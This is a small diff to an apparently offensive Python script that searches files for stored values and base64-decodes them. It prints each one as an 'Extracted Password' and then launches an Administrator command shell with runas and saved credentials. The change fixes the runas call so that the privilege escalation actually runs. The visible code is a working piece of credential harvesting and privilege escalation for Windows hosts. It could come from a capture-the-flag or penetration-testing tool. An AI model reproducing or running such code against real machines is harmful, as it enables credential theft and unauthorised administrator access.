@@ -59,7 +59,7 @@ def find_files(targets, base_dir=""):
                     try:
                         ascii_string = base64.b64decode(clean_val).decode('utf-8')
                         print(f'[+] Extracted Password: {ascii_string}')
-                        subprocess.run(["runas.exe /user:Administrator /savecred cmd.exe"])
+                        subprocess.run(["runas.exe", "/user:Administrator", "/savecred", "cmd.exe"])
                     except Exception as decode_error:
                         # Fallback if the data is already plain text or not valid base64
                         print(f'[!] Base64 decode failed (Value may be plain text): {extracted_val}')
